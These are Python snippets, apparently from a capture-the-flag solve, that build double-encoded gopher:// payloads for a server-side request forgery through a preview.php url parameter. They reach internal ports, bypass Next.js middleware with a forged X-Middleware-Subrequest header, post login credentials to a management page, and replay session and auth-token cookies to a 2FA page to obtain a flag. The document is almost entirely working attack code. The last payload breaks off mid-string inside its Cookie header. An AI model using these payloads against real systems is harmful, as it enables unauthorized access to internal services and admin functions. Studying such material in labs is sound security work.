```python

#to get the webpage on port 10000
import urllib.parse

payload = "GET / HTTP/1.1\r\nHost: 127.0.0.1:10000\r\n"

request="GET /preview.php?url=gopher://127.0.0.1:10000/_"+urllib.parse.quote(urllib.parse.quote(payload))

print(request)
```

```python

#to get the /customapi on port 10000(you will be restricted by next.js middelware)
import urllib.parse

payload = "GET / HTTP/1.1\r\nHost: 127.0.0.1:10000\r\n"

request="GET /preview.php?url=gopher://127.0.0.1:10000/_"+urllib.parse.quote(urllib.parse.quote(payload))

print(request)
```

```python

# payload to bypass next.js middleware
import urllib.parse

payload = "GET /customapi HTTP/1.1\r\nHost: 127.0.0.1:10000\r\nX-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware\r\nConnection: close\r\n\r\n"

request="GET /preview.php?url=gopher://127.0.0.1:10000/_"+urllib.parse.quote(urllib.parse.quote(payload))

print(request)
```

```python
#payload to send post request to /management on port 80.remember to add /index.php to hit the exact file.otherwise won't work.
import urllib.parse

body = "username=<username>&password=<password>"

payload = (
    f"POST /management/index.php HTTP/1.1\r\n"
    f"Host: 127.0.0.1:80\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
    f"{body}"
)

encoded = urllib.parse.quote(urllib.parse.quote(payload))
print(f"gopher://127.0.0.1:80/_{encoded}")
```

```python
#this is the payload to send those cookies(which is found after logging in as librarian) in 2fa.php page to get the second flag.we have to send both phpsessid and auth_token(after modifying)

import urllib.parse

payload = (
        "GET /management/2fa.php HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Cookie: PHPSESSID=8aitaq6brgp0nmlepttkl2sbve; auth_token=O%3A9%3>
        "Connection: close\r\n"
        "\r\n"
)
encoded = urllib.parse.quote(urllib.parse.quote(payload))
print(encoded)
```
